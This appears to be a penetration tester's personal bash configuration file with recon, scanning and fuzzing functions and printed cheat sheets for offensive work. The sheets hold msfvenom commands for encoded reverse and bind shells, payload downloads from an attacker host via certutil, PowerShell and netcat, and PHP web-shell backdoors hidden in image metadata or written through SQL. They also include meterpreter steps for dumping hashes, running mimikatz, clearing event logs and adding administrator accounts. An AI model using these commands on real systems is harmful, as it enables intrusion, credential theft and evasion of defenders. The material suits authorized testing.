# Colors
BLACK='\e[30m'
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
MAGENTA='\e[35m'
CYAN='\e[36m'
WHITE='\e[37m'
RESET='\033[0m'
BOLD='\e[1m'
UNDERLINE='\e[4m'
BLINK='\e[5m'
REVERSE='\e[7m'
REDBOLD='\e[31m\e[1m'
BLUEBOLD='\e[34m\e[1m'

# Aliases 
# alias my_resources="cat /root/referencestuff/my_resources.txt"
alias mysource='source ~/.bashrc'


bringmeit(){
cp /usr/share/exploitdb/exploits/$1 .
echo "Done"
}

crtsh(){
curl -s https://crt.sh/?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
}

certspotter(){ 
curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
} #h/t Michiel Prins

crtshprobe(){ #runs httprobe on all the hosts from certspotter
curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe | tee -a ./all.txt
}

ipinfo(){
curl http://ipinfo.io/$1
}

myip(){
ifconfig | grep 192 | cut -d 'n'  -f 2 | cut -d ' ' -f 2
}

mybash(){
mousepad ~/.bashrc
}

myassetsubfinder(){ # Finish! / subdomains
assetfinder="assetfinder.txt"
subfinder="subfinder.txt"
amass="amass.txt"
github_subdomain="github-subdomain.txt"

assetfinder --subs-only $1 | httpx -silent -threads 100 | tee $assetfinder
subfinder -d $1 -all -o $subfinder
amass -active -brute -o $amass -d $1
cat $assetfinder | anew $subfinder > assetsubfinder_$1.txt
cat $amass | anew assetsubfinder_$1.txt > allsubdomains_$1.txt
mkdir backup_subdomains
mv $assetfinder $subfinder $amass ./backup_subdomains

# github-subdomain -d $1 -o $github_subdomain -t "","","",""
}

myaquatone(){ # Finish! / Screenshots
cat $1 | aquatone -out ./aquatone -ports xlarge
}

mywaymore(){ # Finish! / urls 
python3 /root/tools/waymore/waymore.py -i $1 -mode U -oU ./waymore_$1.txt
cat waymore_$1.txt | urldedupe -s  | uro > urldedupe_uro_$1.txt
cat urldedupe_uro_$1.txt | httprobe -c 80 -t 3000 | tee -a urldedupe_uro_alive_$1.txt 
cat urldedupe_uro_alive_$1.txt | wc -l

# github-endpoints -d $1 -o github-endpoints.txt -t "","","",""
}

myparamspider(){ # Finish! / parameters for a list of targets
paramspider -l $1
}

myparamspider_one(){ # Finish! / parameters for one target
paramspider -d $1
}

my_arjun_one(){ # -u -> urls, -m Http-method, -oT output text
arjun -u $1 -m $2 -oT $3
}

my_arjun_many(){ # -i -> urls.txt
arjun -i $1 -m $2-oT $3
}

mygetjs(){ # Finish! / JS files
getJS --complete --input $1 --output jsfiles_$1.txt
}
mygetjs_one(){ # Finish! / JS files
getJS --complete --url $1 --output jsfiles_$1.txt
}
mygetjs_katana(){ # cat domains.txt
cat $1 | katana | grep js | httpx -mc 200 | tee js_sensitive_ouput_$1.txt
# https://realm3ter.medium.com/analyzing-javascript-files-to-find-bugs-820167476ffe
}

my_subjs(){
cat $1 | subjs
}

# Secretfinder starts
mysecretfinder(){ # Find Api key , aws key , google cloud key from source code and js file
cat $1 | xargs -I@ sh -c 'python3 /root/tools/SecretFinder/SecretFinder.py -i @'
}
mysecretfinder_nuclei(){
nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o nuclei_js_sensitive_ouput_$1.txt
}
# Secretfinder ends


# xnlinkfinder
mylinkfinder_html(){ # Finish! # pass a normal url page or js url
python3 /root/tools/LinkFinder/linkfinder.py -i $1 -o linkfinder_$1.html
}
mylinkfinder_cli(){ # Finish!
python3 /root/tools/LinkFinder/linkfinder.py -i $1 -d -o cli
}

myxnlinkfinder() { # -i option take a url, also a file of urls
urls=$1
subdomains_with_http=$2 # syntax: https://www.target.com; https://help.target.com
subdomains_without_http=$3 # syntax: www.target.com; help.target.com
python3 /root/tools/xnLinkFinder/xnLinkFinder.py -i $urls -d 3 -sp $subdomains_with_http -sf $subdomains_without_http -s429 -s403 -sTO -sCE -m -o xnlinkfinder_endpoints_$1.txt -op xnlinkfinder_parameters_$1.txt -ow

# https://www.kitploit.com/2022/10/xnlinkfinder-python-tool-used-to.html
}
myxnlinkfinder_domains() {
urls=$1
subdomains_with_http=$2
subdomains_without_http=$3
cat $urls | python3 /root/tools/xnLinkFinder/xnLinkFinder.py -d 3 -sp $subdomains_with_http -sf $subdomains_without_http -s429 -s403 -sTO -sCE -m | unfurl domains | sort -u | tee xnlinkfinder_domains_$1.txt
}

myurl_tracker(){
nodejs /root/tools/url-tracker/app.js
}

# Nuclei starts
mynuclei(){
nuclei -t ~/Desktop/bugbounty/nuclei/nuclei-templates -l $1 -o output_nuclei.txt
}

mynuclei_one(){
echo $1 | nuclei -t ~/Desktop/bugbounty/nuclei/nuclei-templates
}

mynuclei_sqli(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/sqli -o output_nuclei_sqli.txt
}

mynuclei_xss(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/xss -o output_nuclei_xss.txt
}


mynuclei_crlf(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/crlf -o output_nuclei_crlf.txt
}

mynuclei_exposed(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/exposed -o output_nuclei_exposed.txt
}

mynuclei_header_injection(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/header_injection -o output_nuclei_header_injection.txt
}

mynuclei_lfi(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/lfi -o output_nuclei_lfi.txt
}

mynuclei_open_redirect(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/open_redirect -o output_nuclei_open_redirect.txt
}

mynuclei_rfi(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/rfi -o output_nuclei_rfi.txt
}

mynuclei_ssi_injection(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/ssi_injection -o output_nuclei_ssi_injection.txt
}

mynuclei_ldap_injection(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/ldap_injection -o output_nuclei_ldap_injection.txt
}
# Nuclei ends 


mydirsearch(){ # runs dirsearch and takes host and extension as arguments
dirsearch -u $1 -e $2 -t 50 -b 
}

mykeyhacks(){
bash /root/tools/keyhacks.sh/keyhacks.sh
}

mynotify(){
message=$1
token=""
chatid=""
curl -s -X POST https://api.telegram.org/bot$token/sendMessage -d chat_id=$chatid -d text=$message
}

### XSS ###
myxss_dalfox(){ # Finish!
cat $1 | dalfox pipe
}
myxss_blind(){ # $1 -> parameters, $2 -> ibrahim.xss.ht
cat $1 | dalfox pipe -b $2
}
myxss_kxss(){ # reflected special characters
cat $1 | kxss 
}
myxss_kxss(){ # reflected parameters
cat $1 | Gxss 
}

### LFI ###
mylfi_dotdotpwn(){ # $1 -> http://testphp.vulnweb.com/search.php?test=
perl /root/tools/dotdotpwn/dotdotpwn.pl -m http-url -u $1TRAVERSAL -k "root:"
}
mylfi_ffuf(){
cat $1 | ffuf -u FUZZ -mr "root:x" -w $2 
}
mylfi_jopmanager(){
cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}
mylfi_many_paths(){
cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 -path-list $2 -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}
mylfi_one_path(){
cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 -path $2 -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}

### SQLi ###
mysqli_sqlmap(){ # Mass sql injection scanning command
cat $1 | gf sqli > sqli.txt; sqlmap -m sqli -batch -random-agent -level 3
}
mysqli_httpx(){
cat $1 | httpx -nc -silent -t 80 -p 80,443,8443,8080,8088,8888,9000,9001,9002,9003 -path "/app_dev.php/1'%20%22" -mr "An exception occurred" -timeout 2 -retries 2 -t 400 -rl 400
}

### SSRF ###
myssrf_qsreplace(){ # $2 -> http://YOUR.burpcollaborator.net
cat $1 | grep "=" | qsreplace $2 | httpx
}

### smuggler ###
mysmuggling_smuggler(){
 echo "mysmuggling_smuggler"
# https://github.com/defparam/smuggler.git
}

### CORS ###
mycors(){
 echo "mycors"
}

### OS command injection ###
myos_injection_httpx(){
cat $1 | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -ports 80,443,8443,8080,8088,8888,9000,9001,9002,9003 -mr "uid=" -silent -timeout 2 -retries 2 -t 300 -rl 300
}

### LDAP injection payloads ###
myldap_injection(){
 echo "myldap_injection"
}

### mix xss, sqli, ssti ###
mymix_ffuf(){
cat $1 | ffuf -w - -u "FUZZ;prompt(90522){{276*5}}'%20%22\\" -mr "prompt(90522)" -mr "An exception occurred" -mr "5520"
}

mysend_to_burpsuite(){
ffuf -mc 200 -w $1:HFUZZ -u HFUZZ -replay-proxy http:127.0.0.1:8080
}

# Android APK
myapk_extract_juicy(){
apktool d $1 ; grep -EHim "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder
}



# Help Commands
my_bugbounty_commands(){
echo -e "
${REDBOLD}### Common ###${RESET}
> ipinfo
> myip
> mybash
> myburpsuite
> bringmeit

${REDBOLD}### Find subdomains ###${RESET}
> crtsh target.com
> certspotter target.com
> crtshprobe target.com
> myassetsubfinder target.com
> amass -active -brute -o output.txt -d yahoo.com
> puredns bruteforce wordlist.txt example.com -r resolvers.txt -w output.txt


${REDBOLD}### Take screenshots ###${RESET}
> myaquatone subdomains.txt
> cat mydomains.txt | aquatone -out /root/Desktop -threads 25 -ports 8080
> eyeWitness -f url-list.txt --web --default-creds

${REDBOLD}### Get endpoints ###${RESET}
> mywaymore subdomains

${REDBOLD}### Get Parameters ###${RESET}
> myparamspider subdomains.txt
> myparamspider_one target.com
> my_arjun_one url get/post output.txt
> my_arjun_many urls.txt get/post output.txt

${REDBOLD}### Get JS files ###${RESET}
> mygetjs subdomains.txt
> mygetjs_one target.com
> mygetjs_katana subdomains.txt

${REDBOLD}### Get Secrets from JS files - SecretFinder.py ###${RESET}
> mysecretfinder js_sensitive_ouput_$1.txt
> mysecretfinder_nuclei js_sensitive_ouput_$1.txt

${REDBOLD}### Get endpoints from JS files ###${RESET}
> mylinkfinder_html js_urls.txt
> mylinkfinder_cli js_urls.txt
> myxnlinkfinder js_urls.txt
> myxnlinkfinder https://target.com/file.js

${REDBOLD}### Get subdomains from JS files ###${RESET}
> myxnlinkfinder_domains js_urls.txt subdomains_https.txt subdomains_nohttps.txt

${REDBOLD}### Tracking stuffs ###${RESET}
> myurl_tracker

${REDBOLD}### Nuclei ###${RESET}
> mynuclei urls.txt
> mynuclei_one target.com
> mynuclei_sqli urls.txt
> mynuclei_xssmynuclei_crlf urls.txt
> mynuclei_crlf urls.txt
> mynuclei_exposed urls.txt
> mynuclei_header_injection urls.txt
> mynuclei_lfi urls.txt
> mynuclei_open_redirect urls.txt
> mynuclei_rfi urls.txt
> mynuclei_ssi_injection urls.txt
> mynuclei_ldap_injection urls.txt

${REDBOLD}### dirsearch ###${RESET}
> mydirsearch https://target.com php,asp

${REDBOLD}### keyhacks ###${RESET}
> mykeyhacks

${REDBOLD}### notify ###${RESET}
> command | mynotify welcome

${REDBOLD}### XSS ###${RESET}
> mydalfox parameters_urls.txt
> myxss_blind
> myxss_kxss
> myxss_Gxss

${REDBOLD}### LFI ###${RESET}
> mylfi_dotdotpwn target.com
> mylfi_ffuf urls.txt lfi-payloads.txt
> mylfi_jopmanager urls.txt
> mylfi_many_paths urls.txt lfi_payloads.txt
> mylfi_one_path urls.txt path/to

${REDBOLD}### SQLi ###${RESET}
> mysqli_sqlmap urls.txt
> mysqli_httpx urls.txt

${REDBOLD}### SSRF ###${RESET}
> myssrf_qsreplace urls.txt my-burp-calloborator

${REDBOLD}### smuggler ###${RESET}
> mysmuggling_smuggler urls.txt

${REDBOLD}### CORS ###${RESET}
> mycors urls.txt

${REDBOLD}### OS command injection ###${RESET}
> myos_injection_httpx urls.txt

${REDBOLD}### LDAP injection ###${RESET}
> myldap_injection urls.txt

${REDBOLD}### mix testing for xss, sqli, ssti ###${RESET}
> mymix_ffuf urls.txt

${REDBOLD}### Burpsuite ###${RESET}
> mysend_to_burpsuite urls.txt

${REDBOLD}### extract sensitive infos from APK ###${RESET}
> myapk_extract_juicy app.apk
"
}


my_todo(){
echo -e "${RED}
- Organise my help commands in the /root/referencestuffs directory
- PWDed 400 Machines + recorde videos or walkthroguh on my website!!
- I should improve my metasploit help commands
- create a pivoting help commands
- 
${RESET}"
}

my_terminator_help(){
echo -e "${BLUE}
New window	 	Shift+Ctrl+I
New Tab			Shift+Ctrl+T
Split terminal		Shift+Ctrl+O/E
Close window	 	Shift+Ctrl+Q
Close terminal	 	Shift+Ctrl+W
Toggle fullscreen	F11
Resize terminal		Shift+Ctrl+<Arrow>
Zoom terminal	 	Shift+Ctrl+Z
Maximise terminal	Shift+Ctrl+X
Reset			Shift+Ctrl+R
Reset + Clear		Shift+Ctrl+G
Begin search		Shift+Ctrl+F
${RESET}"
}

my_methodology(){
echo -e "
${BLUE}
### Methodology: testing a website ###
1. Gather subdomains
2. take screenshots
3. gather urls
4. gather parameters
5. gather js files
6. search in js file for
	- sensitive infos
	- urls
7. nuclei templates for 
	- sqli
	- xss
	- ssrf
	- template injection
	- others
8. nuclei templates in general
9. oneliner

### Methodology: parameters bruteforcing! ###
1. get possible parameters from xnlinkfinder
2. pass the parameter to arjun 
3. test them!

### Methodology: parameters bruteforcing! ###
- jsmon
- url-tracker
${RESET}

"
}

my_colors(){
echo -e "
Text Color:

Black: \e[30m
Red: \e[31m
Green: \e[32m
Yellow: \e[33m
Blue: \e[34m
Magenta: \e[35m
Cyan: \e[36m
White: \e[37m
Text Styles:

Reset: \033[0m
Bold: \e[1m
Underline: \e[4m
Blink: \e[5m
Reverse: \e[7m
\033[0m
"
}


my_commands(){
echo -e "
${BLUE}
my_bugbounty_commands
my_methodology
my_colors
my_commands
my_venomref
my_common
my_metasploit
my_reverseshell
my_breakout
my_terminator_help
my_todo
${RESET}
"
}

my_venomref(){
echo -e "
${YELLOW}================================================================================${RESET}
${CYAN}WINDOWS/SHELL/REVERSE_TCP [PORT 443]${RESET}
msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86 shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/SHELL_REVERSE_TCP (NETCAT x86) [PORT 443]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/SHELL_REVERSE_TCP (NETCAT x64) [PORT 443]${RESET}
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/METERPRETER/REVRESE_TCP (x86) [PORT 443]${RESET}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/METERPRETER/REVRESE_TCP (x64) [PORT 443] AT 10.0.0.67:${RESET}
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_64.exe

${CYAN}---===BIND SHELL, ENCODED, ON PORT 1234===---${RESET}
msfvenom -p windows/shell_bind_tcp LHOST=10.0.0.67 LPORT=1234 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o bindshell_1234_encoded_86.exe

${CYAN}Code for encoding:${RESET}
--platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload_86.exe
================================================================================
${CYAN}[+ Binaries LINUX | WINDOWS | MacOS ]${RESET}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho

${CYAN}[+ Shellcode LINUX | WINDOWS | MacOS ]${RESET}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai

${CYAN}NETCAT${RESET}
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.67 LPORT=1234 -f elf >reverse.elf
================================================================================
${CYAN}[+ Scripting Payloads - Python | Bash | Perl ]${RESET}
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
================================================================================
${RED}[+ PHP ]${RESET}
${CYAN}PHP/METERPRETER_REVERSE_TCP [PORT 443]${RESET}
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${CYAN}PHP/METERPRETER/REVERSE_TCP [PORT 443]${RESET}
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${CYAN}PHP/REVERSE_PHP [PORT 443]${RESET}
msfvenom -p php/reverse_php LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${RED}[+ ASP ]${RESET}
${CYAN}ASP-REVERSE-PAYLOAD [PORT 443]${RESET}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp

${CYAN}OR FOR NETCAT [PORT 443]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp
================================================================================
${CYAN}[+ Client-Side, Unicode Payload - For use with Internet Explorer and IE]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none
#Note: To keep things the same size, if needed add NOPs at the end of the payload.
#A Unicode NOP is - %u9090
================================================================================
${CYAN}# DLL HiJacking - Windows - x64${RESET}
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
================================================================================
"
}

my_bufferOverflow(){
echo "
# Generating Payload Pattern & Calculating Offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 'EIP_VALUE'
"
}



my_common(){
IP='target-ip'
URL='target-url'
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===Nmap====${RESET}
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $IP
nmap –script *ftp* -p 21 $IP
${CYAN}###HTTP-Methods${RESET}
nmap --script http-methods --script-args http-methods.url-path='/website' 
###  --script smb-enum-shares
${CYAN}sed IPs:${RESET}
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
${BLUE}================================================================================
===NFS Exported Shares${RESET}
showmount -e $IP
mount $IP:/vol/share /mnt/nfs -nolock
${BLUE}================================================================================
===RPC / NetBios (137-139) / SMB (445)${RESET}
rpcinfo -p $IP
nbtscan $IP

${CYAN}#list shares${RESET}
smbclient -L //$IP -U ''

${CYAN}# null session${RESET}
rpcclient -U '' $IP
smbclient -L //$IP
enum4linux $IP
${BLUE}================================================================================
===Cracking Web Forms with Hydra${RESET}
https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force

hydra 10.10.10.52 -l username -P /usr/share/wordlists/list 10.0.0.1 ftp
${BLUE}================================================================================
===Compiling Code From Linux${RESET}
${CYAN}# Windows${RESET}
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
${CYAN}# Linux${RESET}
gcc -m32|-m64 -o output source.c

${CYAN}# Compiling Assembly from Windows${RESET}
# https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj
# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj
${BLUE}================================================================================
===Cracking a ZIP Password${RESET}
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
${BLUE}================================================================================
===Port forwarding${RESET}
https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
${BLUE}================================================================================
===Setting up Simple HTTP server${RESET}
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e 'WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start'
php -S 0.0.0.0:80
${BLUE}================================================================================
===Uploading Files to Target Machine${RESET}
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
python -c \"from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')\"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$IP:tmp/backdoor.py
# Attacker
nc -l -p 4444 < /tool/file.exe
# Victim
nc $ATTACKER 4444 > file.exe
${BLUE}================================================================================
===Converting Python to Windows Executable (.py -> .exe)${RESET}
python pyinstaller.py --onefile convert-to-exe.py
${BLUE}================================================================================
===WPScan & SSL${RESET}
wpscan --url $URL --disable-tls-checks --enumerate p, t, u

${CYAN}===WPScan Brute Forceing:${RESET}
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

${CYAN}===Aggressive Plugin Detection:${RESET}
wpscan --url $URL --enumerate p --plugins-detection aggressive

${CYAN}===cmsmap -- (W)ordpress, (J)oomla or (D)rupal or (M)oodle${RESET}
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
================================================================================
${BLUE}===Nikto with SSL and Evasion${RESET}
nikto --host $IP -ssl -evasion 1
SEE EVASION MODALITIES.
${BLUE}================================================================================
===dns_recon${RESET}
dnsrecon –d yourdomain.com
${BLUE}================================================================================
===gobuster directory${RESET}
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30

${CYAN}===gobuster files${RESET}
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30

${CYAN}===gobuster for SubDomain brute forcing:${RESET}
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
'just make sure any DNS name you find resolves to an in-scope address before you test it'
${BLUE}================================================================================
===Extract IPs from a text file${RESET}
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
${BLUE}================================================================================
===Wfuzz XSS Fuzzing${RESET}
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt '$URL'
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt '$URL'

${CYAN}===COMMAND INJECTION WITH POST DATA${RESET}
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d 'doi=FUZZ' '$URL'

${CYAN}===Test for Paramter Existence!${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt '$URL'

${CYAN}===AUTHENTICATED FUZZING DIRECTORIES:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d 'SESSIONID=value' '$URL'

${CYAN}===AUTHENTICATED FILE FUZZING:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d 'SESSIONID=value' '$URL'

${CYAN}===FUZZ Directories:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 '$URL'

${CYAN}===FUZZ FILES:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 '$URL'
|
${CYAN}LARGE WORDS:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 '$URL'
|
${CYAN}USERS:${RESET}
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 '$URL'
${BLUE}================================================================================
===ffuf ${RESET}
ffuf -w /path/to/wordlist -u https://target/FUZZ
ffuf -w /path/to/vhost/wordlist -u https://target -H 'Host: FUZZ'
https://github.com/vavkamil/awesome-bugbounty-tools#fuzzing
${BLUE}================================================================================
===dirsearch ${RESET}
# -e for extension 
# -t for threads 
# --proxy=http://127.0.0.1:8080
# --recursive
# --random-agents
# --exclude-status=400,403,404
python3 dirsearch.py -u https://target-website.local -w wordlist -e txt,xml,php
${BLUE}================================================================================
===Command Injection with commix, ssl, waf, random agent ${RESET}
commix --url='https://supermegaleetultradomain.com?parameter=' --level=3 --force-ssl --skip-waf --random-agent
${BLUE}================================================================================
===SQLMap${RESET}
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt
${BLUE}================================================================================
===Social Recon${RESET}
theharvester -d domain.org -l 500 -b google
${BLUE}================================================================================
===Nmap HTTP-methods${RESET}
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
${BLUE}================================================================================
===SMTP USER ENUM${RESET}
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
${BLUE}================================================================================
===Command Execution Verification - [Ping check]${RESET}
===
crackmapexec 192.168.1.5 -u Administrator -p 'PASS' -x whoami
crackmapexec 192.168.1.5 -u 'Administrator' -p 'PASS' --lusers
crackmapexec 192.168.1.0/24 -u 'Administrator' -p 'PASS' --local-auth --sam

====

====
#INTO OUTFILE D00R
SELECT '' into outfile '/var/www/WEROOT/backdoor.php';
${BLUE}================================================================================
====LFI?${RESET}
#PHP Filter Checks.
php://filter/convert.base64-encode/resource=
${BLUE}================================================================================
====UPLOAD IMAGE?${RESET}
GIF89a1
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98)
00%
file.jpg with php backdoor in exif 
	exiv2 -c'A \"<?php system($_REQUEST['cmd']);?>\"!' backdoor.jpeg
	exiftool '-comment<=back.php' back.png
.jpg -> proxy intercept -> rename to .php
"
}

my_metasploit(){
echo -e "
${YELLOW}================================================================================${RESET}
msf> search platform:windows port:135 target:XP type:exploit
${BLUE}================================================================================
===Meterpreter Cheat Sheet${RESET}
upload file c:\\windows
download c:\\windows\\\repair\\sam /tmp
execute -f c:\\windows\\\temp\\exploit.exe
execute -f cmd -c
ps
shell
edit      	# Edit a file in vi editor
getsystem
migrate 
clearev      	# Clear the system logs
hashdump
getprivs    	# Shows multiple privileges as possible
portfwd add –l 3389 –p 3389 –r target
portfwd delete –l 3389 –p 3389 –r target
${BLUE}================================================================================
===Metasploit Modules${RESET}
use exploit/windows/local/bypassuac
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
post/windows/manage/powershell/exec_powershell
use exploit/multi/http/jboss_maindeployer
use exploit/windows/mssql/mssql_payload
run post/windows/gather/win_privs
use post/windows/gather/credentials/gpp
use post/windows/gather/hashdump
${BLUE}================================================================================
=====Metasploit Modules
===Mimikatz/kiwi${RESET}
load kiwi
creds_all
run post/windows/gather/local_admin_search_enum
set AUTORUNSCRIPT post/windows/manage/migrate
${BLUE}================================================================================
===Meterpreter Payloads${RESET}
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD='net localgroup administrators shaun /add' -f exe > pay.exe
